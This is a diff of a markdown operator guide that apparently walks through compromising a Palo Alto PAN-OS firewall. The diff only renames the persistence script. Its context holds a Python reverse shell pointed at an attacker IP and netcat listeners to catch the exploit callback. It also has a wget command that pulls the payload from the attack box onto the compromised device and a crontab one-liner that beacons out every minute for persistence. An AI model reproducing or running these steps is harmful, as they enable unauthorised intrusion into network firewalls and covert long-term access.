@@ -63,7 +63,7 @@ ssh -p 4444 localhost   # tunnel to Djibouti
 
 ### Persistence Script Setup
 
-1. Perform the following command: `nano pan_os_comm.py`
+1. Perform the following command: `nano pan_os_comm`
 2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
 
 #### (ATTACKER MACHINE)
@@ -88,7 +88,7 @@ pty.spawn("/bin/bash")
 
 ```
 
-3. Once created, run the following command: `chmod +x pan_os_comm.py`
+3. Once created, run the following command: `chmod +x pan_os_comm`
 
 ### Create your netcat
 
@@ -235,7 +235,7 @@ KG+Vs7e5$dF4
 1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
 2. In one of the terminal panes, set up your initial lsitener using Netcat to catch the callback shell from the exploit. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
    - `nc -lnv 7837`
-3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm.py* script that was created earlier.
+3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm* script that was created earlier.
 4. Run the following command to start the second listener:
    - `nc -lnv 63842`
 
@@ -272,7 +272,7 @@ Troubleshooting steps:
 - `Ctrl-Z` OR `Ctrl-C` **WILL KILL YOUR SHELL**
 - Palo Alto Shell has limited functionality
 - **Tab autocompletion and the up/down arrow keys won’t work**
-- The first priority is to establish persistence using a cron job and the pan_os_comm.py script you created earlier.
+- The first priority is to establish persistence using a cron job and the pan_os_comm script you created earlier.
 
 1. Start by running some basic enumeration commands to get a sense of your current environment on the machine.
 
@@ -287,8 +287,8 @@ cd ~
 ls
 ```
 
-2. Next, import the `pan_os_comm.py` script from your attack machine, where it is being hosted via the web server.
-   `wget -O /usr/local/bin/pan_os_comm.py http://<IP_of_your_attack_box>:<port>/pan_os_comm.py`
+2. Next, import the `pan_os_comm` script from your attack machine, where it is being hosted via the web server.
+   `wget -O /usr/local/bin/pan_os_comm http://<IP_of_your_attack_box>:<port>/pan_os_comm`
 
 3. To ensure that the file has been successfully downloaded and is executable, run:
 
@@ -299,10 +299,11 @@ ls -l /usr/local/bin | grep pan_os
 4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
 
 ```bash
-(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm.py >/dev/null 2>&1") | crontab -
+(crontab -l 2>/dev/null; echo "* * * * * /usr/bin/python3 /usr/local/bin/pan_os_comm >/dev/null 2>&1") | crontab -
 ```
 
-NOTE- This will add a cron job that runs every minute, calling your pan_os_comm.py script and sending a beacon to your second listener.
+NOTE- This will add a cron job that runs every minute, calling your pan_os_comm
+script and sending a beacon to your second listener.
 
 6. To check that your cron job has been successfully added, run the following:
    `crontab -l`
